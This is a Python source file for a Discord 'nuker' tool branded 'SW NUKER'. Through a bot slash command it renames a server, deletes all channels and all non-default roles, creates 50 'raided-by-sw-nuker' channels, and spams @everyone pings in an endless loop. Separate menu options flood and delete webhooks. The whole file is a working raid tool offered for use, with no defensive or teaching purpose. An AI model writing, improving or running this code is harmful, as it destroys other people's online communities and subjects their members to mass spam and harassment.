import discord
from discord.ext import commands
import asyncio
import aiohttp
from colorama import init, Fore

init()

ART = f"""
{Fore.RED}░██████╗░██╗░░░░░░░██╗  ███╗░░██╗██╗░░░██╗██╗░░██╗███████╗██████╗░
██╔════╝░██║░░██╗░░██║  ████╗░██║██║░░░██║██║░██╔╝██╔════╝██╔══██╗
╚█████╗░░╚██╗████╗██╔╝  ██╔██╗██║██║░░░██║█████═╝░█████╗░░██████╔╝
░╚═══██╗░░████╔═████║░  ██║╚████║██║░░░██║██╔═██╗░██╔══╝░░██╔══██╗
██████╔╝░░╚██╔╝░╚██╔╝░  ██║░╚███║╚██████╔╝██║░╚██╗███████╗██║░░██║
╚═════╝░░░░╚═╝░░░╚═╝░░  ╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝{Fore.RESET}
"""

message = "@everyone @here SW NUKER ON TOP"
channel_name = "raided-by-sw-nuker"
new_server_name = "SW NUKER ON TOP"

intents = discord.Intents.default()
intents.messages = True
intents.guilds = True
bot = commands.Bot(command_prefix='!', intents=intents)

def display_menu():
    print(ART)
    print(f"{Fore.RED}1. Nuke Server with Bot Token{Fore.RESET}")
    print(f"{Fore.RED}2. Spam Webhook{Fore.RESET}")
    print(f"{Fore.RED}3. Delete Webhook{Fore.RESET}")
    print(f"{Fore.RED}4. Exit{Fore.RESET}")
    choice = input(f"{Fore.RED}Select an option: {Fore.RESET}")
    return choice

async def nuke_server():
    bot_token = input(f"{Fore.RED}Enter your bot token: {Fore.RESET}")
    await bot.start(bot_token)

async def spam_webhook():
    webhook_url = input(f"{Fore.RED}Enter the webhook URL: {Fore.RESET}")
    message = input(f"{Fore.RED}Enter the message to spam: {Fore.RESET}")
    count = int(input(f"{Fore.RED}Enter the number of messages to send: {Fore.RESET}"))

    async with aiohttp.ClientSession() as session:
        for i in range(count):
            try:
                async with session.post(webhook_url, json={"content": message}) as response:
                    if response.status == 204:
                        print(f"{Fore.RED}Message {i+1}/{count} sent successfully!{Fore.RESET}")
                    else:
                        print(f"{Fore.RED}Failed to send message {i+1}/{count}. Status code: {response.status}{Fore.RESET}")
            except Exception as e:
                print(f"{Fore.RED}Error sending message {i+1}/{count}: {e}{Fore.RESET}")

async def delete_webhook():
    webhook_url = input(f"{Fore.RED}Enter the webhook URL to delete: {Fore.RESET}")

    async with aiohttp.ClientSession() as session:
        try:
            async with session.delete(webhook_url) as response:
                if response.status == 204:
                    print(f"{Fore.RED}Webhook deleted successfully!{Fore.RESET}")
                else:
                    print(f"{Fore.RED}Failed to delete webhook. Status code: {response.status}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}Error deleting webhook: {e}{Fore.RESET}")

@bot.event
async def on_ready():
    print(f'{Fore.RED}Logged in as {bot.user}{Fore.RESET}')
    try:
        synced = await bot.tree.sync()
        print(f"{Fore.RED}Synced {len(synced)} command(s).{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}Error syncing commands: {e}{Fore.RESET}")

@bot.tree.command(name="start", description="start")
async def nuke(interaction: discord.Interaction):
    guild = interaction.guild
    await interaction.response.send_message("Starting nuke process...", ephemeral=True)

    try:
        await guild.edit(name=new_server_name)
        print(f"{Fore.RED}Changed server name to: {new_server_name}{Fore.RESET}")
    except discord.Forbidden:
        print(f"{Fore.RED}Could not change server name (missing permissions){Fore.RESET}")
    except discord.HTTPException as e:
        print(f"{Fore.RED}Error changing server name: {e}{Fore.RESET}")

    delete_tasks = []
    for channel in guild.channels:
        try:
            delete_tasks.append(channel.delete())
        except discord.Forbidden:
            print(f"{Fore.RED}Could not delete channel {channel.name}{Fore.RESET}")
    await asyncio.gather(*delete_tasks)

    delete_role_tasks = []
    for role in guild.roles:
        try:
            if role.name == "@everyone":
                continue
            delete_role_tasks.append(role.delete())
        except discord.Forbidden:
            print(f"{Fore.RED}Could not delete role {role.name}{Fore.RESET}")
        except discord.HTTPException as e:
            print(f"{Fore.RED}Error deleting role {role.name}: {e}{Fore.RESET}")
    await asyncio.gather(*delete_role_tasks)

    create_tasks = []
    for _ in range(50):
        create_tasks.append(guild.create_text_channel(channel_name))
    await asyncio.gather(*create_tasks)

    new_channel = guild.text_channels[0]
    print(f"{Fore.RED}Nuke process complete! Repeating message until KeyboardInterrupt or CTRL + C{Fore.RESET}")

    try:
        while True:
            send_tasks = []
            for channel in guild.text_channels:
                try:
                    send_tasks.append(channel.send(message))
                except discord.Forbidden:
                    print(f"{Fore.RED}Could not send message in channel {channel.name}{Fore.RESET}")
                except discord.HTTPException as e:
                    print(f"{Fore.RED}Error sending message in channel {channel.name}: {e}{Fore.RESET}")

            await asyncio.gather(*send_tasks)
            await asyncio.sleep(0.5)

    except KeyboardInterrupt:
        print(f"{Fore.RED}Stopping message repetition.{Fore.RESET}")

async def main():
    while True:
        choice = display_menu()
        if choice == "1":
            await nuke_server()
        elif choice == "2":
            await spam_webhook()
        elif choice == "3":
            await delete_webhook()
        elif choice == "4":
            print(f"{Fore.RED}Exiting...{Fore.RESET}")
            break
        else:
            print(f"{Fore.RED}Invalid option. Please try again.{Fore.RESET}")

if __name__ == "__main__":
    asyncio.run(main())
